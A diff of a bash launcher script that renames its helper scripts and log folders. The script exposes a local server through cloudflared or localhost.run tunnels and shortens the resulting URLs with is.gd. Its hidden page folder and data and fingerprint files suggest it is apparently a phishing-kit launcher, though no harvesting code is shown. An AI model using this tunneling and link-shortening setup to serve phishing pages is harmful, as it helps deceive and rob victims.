@@ -1,14 +1,14 @@
 #!/bin/bash
 #permissions
 
-chmod -R 777 packages.sh
-chmod -R 777 tunnels.sh
+chmod -R 777 pack.sh
+chmod -R 777 tunneling.sh
 chmod -R 777 data.txt
 chmod -R 777 fingerprints.txt
 chmod -R 777 .host
 chmod -R 777 .pages
-chmod -R 777 .tunnels_log
-chmod -R 777 .wwwSS
+chmod -R 777 .logs
+chmod -R 777 .www
 
 
 #Install packages and tunnels
@@ -26,12 +26,12 @@ else
 
 OS_SYSTEM=$(uname -o)	
 if [ $OS_SYSTEM != Android ]; then
-     bash packages.sh
-     bash tunnels.sh
+     bash pack.sh
+     bash tunneling.sh
 
 else	
- ./packages.sh
- ./tunnels.sh
+ ./pack.sh
+ ./tunneling.sh
  	
 fi	
 
@@ -93,9 +93,9 @@ fi
 
 # Clear content of log files
 
-truncate -s 0 .tunnels_log/.cloudfl.log 
+truncate -s 0 .logs/.cloudfl.log 
 
-truncate -s 0 .tunnels_log/.localrun.log 
+truncate -s 0 .logs/.localrun.log 
 
 
 
@@ -503,14 +503,14 @@ cloudflared_start() {
 	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGETNA} Launching Cloudflared..."
 
     if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
+		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
     else
-        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
+        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
     fi
 
 	{ sleep 12; clear; header; }
 	
-	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
+	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".logs/.cloudfl.log")
 	cldflr_url1=${cldflr_url#https://}
 	
 	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
@@ -535,14 +535,14 @@ cloudflared_start_customize() {
 	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGETNA} Launching Cloudflared..."
 
     if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
+		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
     else
-        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
+        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
     fi
 
 	{ sleep 12; clear; header; }
 	
-	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
+	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".logs/.cloudfl.log")
 	cldflr_url1=${cldflr_url#https://}
 	
 	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
@@ -566,14 +566,14 @@ cloudflared_start_manual() {
 	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching Cloudflared..."
 
     if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
+		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
     else
-        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
+        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
     fi
 
 	{ sleep 12; clear; header; }
 	
-	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
+	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".logs/.cloudfl.log")
 	cldflr_url1=${cldflr_url#https://}
 	
 	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
@@ -598,14 +598,14 @@ localhostrun_start() {
 	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."
 
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
+        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
     else
-        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
+        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
     fi
 
 	{ sleep 9; clear; header; }
 	
-	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
+	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".logs/.localrun.log")
 	localrun_url1=${localrun_url#https://}
 	
 	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
@@ -628,14 +628,14 @@ localhostrun_start_customize() {
 	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."
 
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
+        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
     else
-        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
+        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
     fi
 
 	{ sleep 9; clear; header; }
 	
-	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
+	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".logs/.localrun.log")
 	localrun_url1=${localrun_url#https://}
 	
 	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
@@ -658,14 +658,14 @@ localhostrun_start_manual() {
 	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."
 
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
+        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
     else
-        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
+        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
     fi
 
 	{ sleep 9; clear; header; }
 	
-	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
+	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".logs/.localrun.log")
 	localrun_url1=${localrun_url#https://}
 	
 	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
